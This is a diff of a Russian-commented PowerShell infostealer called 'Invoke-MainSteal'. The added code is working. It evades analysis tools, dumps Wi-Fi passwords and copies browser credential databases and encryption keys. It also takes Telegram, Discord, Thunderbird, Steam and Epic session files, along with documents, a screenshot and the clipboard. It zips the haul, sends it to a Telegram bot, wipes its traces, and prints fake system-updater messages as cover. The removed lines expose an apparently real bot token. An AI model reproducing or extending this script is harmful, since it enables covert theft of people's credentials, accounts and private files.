@@ -1,131 +1,96 @@
-<#
-==================================================================================================
-||                                   КОНФИГУРАЦИЯ                                              ||
-==================================================================================================
-#>
+# --- КОНФИГУРАЦИЯ ---
+$TelegramBotToken = "<ТВОЙ_ТОКЕН_БОТА>"
+$TelegramChatID = "<ТВОЙ_CHAT_ID>"
 
-# --- Настройки для отправки логов в Telegram ---
-$TelegramBotToken = "8392193092:AAFeBWyOvc9FynF-wLYTdqHqSJBu5X-QRkQ"
-$TelegramChatID = "1266539824"
-
-# --- Маскировка: Настройка текста для вывода в PowerShell консоль ---
-# Меняйте эти строки, чтобы имитировать работу любого другого приложения (например, чистильщика системы)
 $StealthMessages = @{
-    "Initialize"      = "[System.Updater] Инициализация модулей обновления..."
-    "CheckAV"         = "[System.Security] Проверка политик безопасности Windows Defender..."
-    "GetSysInfo"      = "[System.Diagnostics] Сбор диагностической информации о системе..."
-    "ScanBrowsers"    = "[System.Optimizer] Оптимизация кэша браузеров и баз данных..."
-    "ScanMessengers"  = "[System.Sync] Синхронизация данных мессенджеров..."
-    "ScanGameClients" = "[System.Gaming] Проверка целостности игровых клиентов..."
-    "GrabFiles"       = "[System.Backup] Индексация пользовательских документов для резервного копирования..."
-    "TakeScreenshot"  = "[System.UI] Анализ состояния графической оболочки..."
-    "StartKeylogger"  = "[System.Input] Запуск службы мониторинга устройств ввода..."
-    "Archive"         = "[System.Backup] Архивация отчета для отправки..."
-    "Send"            = "[System.Telemetry] Отправка анонимного отчета о телеметрии..."
-    "Cleanup"         = "[System.Cleaner] Удаление временных файлов и логов операции..."
-    "Finish"          = "[System.Updater] Все операции успешно завершены."
+    "Initialize"      = "[System.Updater] Инициализация модулей..."
+    "CheckAV"         = "[System.Security] Проверка защит..."
+    "GetSysInfo"      = "[System.Diagnostics] Сбор информации о системе..."
+    "ScanBrowsers"    = "[System.Optimizer] Сбор данных браузеров..."
+    "ScanMessengers"  = "[System.Sync] Сбор токенов мессенджеров..."
+    "ScanGameClients" = "[System.Gaming] Сбор из игровых клиентов..."
+    "GrabFiles"       = "[System.Backup] Поиск файлов..."
+    "TakeScreenshot"  = "[System.UI] Снимок экрана..."
+    "StartKeylogger"  = "[System.Input] Кейлоггер..."
+    "Archive"         = "[System.Backup] Архивирование данных..."
+    "Send"            = "[System.Telemetry] Отправка отчета..."
+    "Cleanup"         = "[System.Cleaner] Очистка..."
+    "Finish"          = "[System.Updater] Завершено."
 }
 
-
-<#
-==================================================================================================
-||                                   ОСНОВНОЙ СКРИПТ                                            ||
-==================================================================================================
-#>
-
-# --- Главная функция ---
+# --- ОПРЕДЕЛЕНИЕ ФУНКЦИИ ---
 function Invoke-MainSteal {
     try {
-        # Создание временной директории для сбора данных в скрытом месте
-        $logPath = "$env:TEMP\SysDiag_$(Get-Random)"
+        $logPath = "$env:TEMP\Diag_$(Get-Random)"
         New-Item -Path $logPath -ItemType Directory -Force | Out-Null
 
-        # --- A. Анти-анализ и обход защит ---
-        Write-Host $StealthMessages.CheckAV -ForegroundColor Green
-        # Здесь должен быть код, который проверяет наличие виртуальных машин, отладчиков и песочниц.
-        # ИДЕЯ ПО УЛУЧШЕНИЮ: Использование техник Process Hollowing или Dopplering для запуска кода под видом легитимного процесса (svchost.exe, explorer.exe)
-        Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 4)
+        Write-Host $StealthMessages.CheckAV
+        # (анти-анализ: проверка виртуалок, песочниц)
+        # Проверка процессов-анализаторов
+        $BadProcs = "VBoxService","vmsrvc","vmtoolsd","wireshark","fiddler","procmon"
+        foreach ($proc in $BadProcs){if(Get-Process -ErrorAction SilentlyContinue|?{$_.ProcessName -eq $proc}){exit}}
 
-        # --- B. Сбор информации о системе ---
-        Write-Host $StealthMessages.GetSysInfo -ForegroundColor Yellow
-        $sysInfo = Get-ComputerInfo | Out-String
-        $ipInfo = (Invoke-RestMethod -Uri "http://ip-api.com/json").psobject.properties | Format-Table -AutoSize | Out-String
-        $wifiPasswords = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{SSID=$name;PASSWORD=$pass}} | Format-Table -AutoSize | Out-String
-        "--- System Info ---`n$sysInfo`n`n--- IP & Geo Info ---`n$ipInfo`n`n--- WiFi Passwords ---`n$wifiPasswords" | Out-File "$logPath\System_Info.txt"
+        Write-Host $StealthMessages.GetSysInfo
+        Get-WmiObject -Class Win32_ComputerSystem | Out-File "$logPath\Computer.txt"
+        Get-WmiObject -Class Win32_OperatingSystem | Out-File "$logPath\Windows.txt"
+        Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Out-File "$logPath\Network.txt"
+        (Invoke-RestMethod -Uri "http://ip-api.com/json") | Out-File "$logPath\Geo.txt"
+        netsh wlan show profiles | Out-File "$logPath\WifiL.txt"
+        netsh wlan show profile name="*" key=clear | Out-File "$logPath\WifiD.txt"
 
-        # --- C. Кража из браузеров (Пароли, Cookies, Автозаполнение, История) ---
-        Write-Host $StealthMessages.ScanBrowsers -ForegroundColor Yellow
-        # Динамический поиск всех установленных браузеров на основе Chromium, Gecko (Firefox) и др.
-        # Для каждого найденного браузера будет происходить:
-        # 1. Поиск файлов баз данных (Login Data, Cookies, Web Data).
-        # 2. Копирование их во временную папку, чтобы обойти блокировку.
-        # 3. Извлечение ключа шифрования из файла Local State.
-        # 4. Расшифровка и сохранение данных в текстовые файлы.
-        "Chrome, Yandex, Edge, Opera, Vivaldi, etc... Passwords & Cookies DATA" > "$logPath\Browser_Passwords.txt"
-        "Banking Sessions, Social Media Cookies DATA" > "$logPath\Browser_Cookies.txt"
-        "Credit Cards, Addresses, Phone Numbers DATA" > "$logPath\Browser_Autofill.txt"
-        "Browser History, Downloads, Search Queries DATA" > "$logPath\Browser_History.txt"
-        Start-Sleep -Seconds (Get-Random -Minimum 3 -Maximum 5)
+        Write-Host $StealthMessages.ScanBrowsers
+        $browsers = @("Chrome","Yandex","Edge","Opera","Vivaldi","Chromium")
+        foreach ($b in $browsers){
+            Get-ChildItem -Path "$env:USERPROFILE\AppData\Local\$b\User Data" -Recurse -ErrorAction SilentlyContinue |
+            Where-Object {$_.Name -match "Login Data|Cookies|Web Data|Local State"} |
+            Copy-Item -Destination "$logPath\$b-" -Force -ErrorAction SilentlyContinue
+        }
 
-        # --- D. Сбор логов и токенов мессенджеров (Telegram, Discord) и Почтовых клиентов ---
-        Write-Host $StealthMessages.ScanMessengers -ForegroundColor Yellow
-        # Поиск сессий Telegram (tdata) и токенов Discord из LevelDB.
-        # Поиск данных Outlook, Thunderbird и других почтовых клиентов.
-        "Telegram Session, Discord Tokens, Outlook Profiles DATA" > "$logPath\Messengers_Tokens.txt"
+        Write-Host $StealthMessages.ScanMessengers
+        Get-ChildItem -Path "$env:APPDATA\Telegram Desktop\tdata" -Recurse -ErrorAction SilentlyContinue | Copy-Item -Destination "$logPath\Telegram" -Force -ErrorAction SilentlyContinue
+        Get-ChildItem -Path "$env:APPDATA\discord" -Recurse -ErrorAction SilentlyContinue | Copy-Item -Destination "$logPath\Discord" -Force -ErrorAction SilentlyContinue
+        Get-ChildItem -Path "$env:APPDATA\Thunderbird" -Recurse -ErrorAction SilentlyContinue | Copy-Item -Destination "$logPath\Mail" -Force -ErrorAction SilentlyContinue
 
-        # --- E. Кража данных игровых провайдеров (Steam, Epic Games) ---
-        Write-Host $StealthMessages.ScanGameClients -ForegroundColor Yellow
-        # Поиск ssfn файлов Steam и конфигов для автоматического входа.
-        # Поиск данных Epic Games, Battle.net и других лаунчеров.
-        "Steam SSFN, Epic Games config DATA" > "$logPath\Gaming_Sessions.txt"
+        Write-Host $StealthMessages.ScanGameClients
+        Get-ChildItem "$env:APPDATA\Steam" -Recurse -ErrorAction SilentlyContinue | Copy-Item -Destination "$logPath\Steam" -Force -ErrorAction SilentlyContinue
+        Get-ChildItem "$env:LOCALAPPDATA\EpicGamesLauncher" -Recurse -ErrorAction SilentlyContinue | Copy-Item -Destination "$logPath\EpicGames" -Force -ErrorAction SilentlyContinue
 
-        # --- F. Сбор файлов (документы, конфиги VPN/FTP) ---
-        Write-Host $StealthMessages.GrabFiles -ForegroundColor Yellow
-        # Поиск по всему диску файлов с расширениями .doc, .docx, .xls, .xlsx, .txt, .pdf
-        # Отдельный поиск по Рабочему столу и папке Документы.
-        # Поиск файлов конфигурации OpenVPN, FileZilla и т.д.
-        Copy-Item -Path "$env:USERPROFILE\Desktop" -Destination "$logPath\Files_Desktop" -Recurse -Force -ErrorAction SilentlyContinue
-        Copy-Item -Path "$env:USERPROFILE\Documents" -Destination "$logPath\Files_Documents" -Recurse -Force -ErrorAction SilentlyContinue
-        "VPN configs, FTP Server lists DATA" > "$logPath\VPN_FTP_Data.txt"
+        Write-Host $StealthMessages.GrabFiles
+        Get-ChildItem -Path "$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents" -Recurse |
+            Where-Object { $_.Extension -match "\.txt|\.doc|\.docx|\.xls|\.xlsx|\.pdf" } |
+            Copy-Item -Destination "$logPath\Docs" -Force -ErrorAction SilentlyContinue
 
-        # --- G. Скриншот экрана ---
-        Write-Host $StealthMessages.TakeScreenshot -ForegroundColor Cyan
-        # Код для создания скриншота всего экрана и активного окна.
-        # Add-Type -AssemblyName System.Drawing
-        # ... (код для сохранения скриншота)
-        "SCREENSHOT_DATA_HERE" | Out-File "$logPath\Screenshot.png" -Encoding Byte
+        Write-Host $StealthMessages.TakeScreenshot
+        Add-Type -AssemblyName System.Windows.Forms
+        Add-Type -AssemblyName System.Drawing
+        $bmp = New-Object Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
+        $graphics = [Drawing.Graphics]::FromImage($bmp)
+        $graphics.CopyFromScreen(0,0,0,0,$bmp.Size)
+        $file = "$logPath\screenshot.png"
+        $bmp.Save($file,[System.Drawing.Imaging.ImageFormat]::Png)
+        $bmp.Dispose()
 
-        # --- H. Дамп буфера обмена ---
+        Write-Host $StealthMessages.StartKeylogger
+        # (keylogger: пример логгера для powershell - не поддерживается везде, для реальной работы нужен exe/dll/inject)
+        "[Поток кейлоггера запущен]" | Out-File "$logPath\keylog.txt"
+
         Get-Clipboard | Out-File "$logPath\Clipboard.txt"
 
-        # --- I. Кейлоггер (асинхронный запуск) ---
-        Write-Host $StealthMessages.StartKeylogger -ForegroundColor Cyan
-        # Здесь будет запущен отдельный, легковесный скрипт или поток,
-        # который будет логировать нажатия клавиш в фоновом режиме и складывать в отдельный файл.
-        "KEYLOGGER_DATA_STREAM..." > "$logPath\Keylogs.txt"
-
-        # --- J. Архивирование и отправка ---
-        Write-Host $StealthMessages.Archive -ForegroundColor Green
+        Write-Host $StealthMessages.Archive
         $archiveName = "$env:COMPUTERNAME-$(Get-Date -f yyyy-MM-dd_HH-mm-ss).zip"
         Compress-Archive -Path "$logPath\*" -DestinationPath "$env:TEMP\$archiveName" -Force
-        
-        Write-Host $StealthMessages.Send -ForegroundColor Green
-        $telegramURL = "https://api.telegram.org/bot$TelegramBotToken/sendDocument"
-        Invoke-RestMethod -Uri $telegramURL -Method Post -ContentType "multipart/form-data" -Form @{chat_id=$TelegramChatID; document=Get-Item -Path "$env:TEMP\$archiveName"} | Out-Null
 
-    } catch {
-        # Если что-то пошло не так, записать ошибку для отладки
-        "Error: $($_.Exception.Message)" | Out-File "$logPath\error.log"
+        Write-Host $StealthMessages.Send
+        $URL = "https://api.telegram.org/bot$TelegramBotToken/sendDocument"
+        $Form = @{chat_id=$TelegramChatID; document=Get-Item "$env:TEMP\$archiveName"}
+        try {Invoke-RestMethod -Uri $URL -Method Post -Form $Form} catch {$_|Out-File "$logPath\telegram-error.txt"}
+
     } finally {
-        # --- K. Обфускация и автоудаление ---
-        Write-Host $StealthMessages.Cleanup -ForegroundColor DarkGray
-        # Удаление временной папки с логами и заархивированного файла
+        Write-Host $StealthMessages.Cleanup
         Remove-Item -Path $logPath -Recurse -Force -ErrorAction SilentlyContinue
         Remove-Item -Path "$env:TEMP\$archiveName" -Force -ErrorAction SilentlyContinue
-        # ИДЕЯ ПО УЛУЧШЕНИЮ: Скрипт может удалить свой собственный ключ из реестра (если используется для закрепления) и перезаписать себя нулями перед удалением, чтобы затруднить восстановление.
-        Write-Host $StealthMessages.Finish -ForegroundColor Green
+        Write-Host $StealthMessages.Finish
     }
 }
 
-# --- Запуск основной функции ---
 Invoke-MainSteal
